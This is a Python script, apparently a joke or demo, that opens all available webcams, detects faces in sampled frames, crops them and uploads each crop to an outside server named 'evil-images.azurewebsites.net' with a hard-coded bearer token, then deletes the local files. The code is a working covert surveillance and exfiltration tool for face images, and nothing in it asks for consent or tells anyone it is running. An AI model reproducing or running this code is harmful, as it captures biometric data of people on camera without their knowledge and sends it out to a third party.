import cv2, random, string, time, os, requests, math, sys

api = "http://evil-images.azurewebsites.net/image"
delay = 60 # Capture every X frame
expand = 50
imagePath = "./out/"
cascPath = "./haarcascades/haarcascade_frontalface_default.xml"
faceCascade = cv2.CascadeClassifier(cascPath)

def generate_filename():
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))

def get_headers():
    return {
        'Authorization': 'Bearer totallyevilstuff'
    }

def post(path):
    img = open(path).read()
    os.remove(path)
    print(requests.post(url=api, data=img, headers=get_headers()))

def open_all_the_cams(max_cams=4):
    cams = []
    for i in range(max_cams):
        print("Trying to open cam " + str(i));
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            cams.append(cap)
    return cams

def close_all_the_cams(max_cams=4):
    for i in range(max_cams):
        cv2.VideoCapture()

def get_all_the_frames(cams):
    frames = []
    for cam in cams:
        ret, frame = cam.read()
        frames.append(frame)
    return frames

def detect_and_report_all_cams(cams):
    frames = get_all_the_frames(cams)
    
    for frame in frames:
        detect_and_report(frame)
        # DEBUG
        #cv2.imshow("input", frame)

def detect_and_report(frame):
    # find faces
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    faces = faceCascade.detectMultiScale(
        gray,
        scaleFactor=1.1,
        minNeighbors=5,
        minSize=(30, 30),
        #flags=cv2.CV_HAAR_SCALE_IMAGE
    )
    for face in faces:
        report_face(frame, face)

def report_face(frame, face):
    (x, y, w, h) = face
    cv2.rectangle(frame, (x-expand, y-expand), (x+w+expand, y+h+expand), (0, 255, 0), 2)
    result = frame[y-expand-10:y+h+expand+10, x-expand-10:x+w+expand+10]
    filename = imagePath + generate_filename() + ".jpg"
    cv2.imwrite(filename, result)
    post(filename)

if __name__ == '__main__':
    print("Opening cameras")
    max_cams = 1
    if len(sys.argv) > 1:
        max_cams = int(sys.argv[1])
    cams = open_all_the_cams(max_cams)
    if len(cams) == 0:
        print("No cams found, exiting...")
        sys.exit(1)
    frameCounter = 0
    while True:
        frameCounter += 1
        # throw most frames away
        if (frameCounter % delay != 0):
            get_all_the_frames(cams)
            continue
        detect_and_report_all_cams(cams)
        key = cv2.waitKey(10)
        if key == 27:
            break
    close_all_the_cams()
    cv2.destroyAllWindows() 
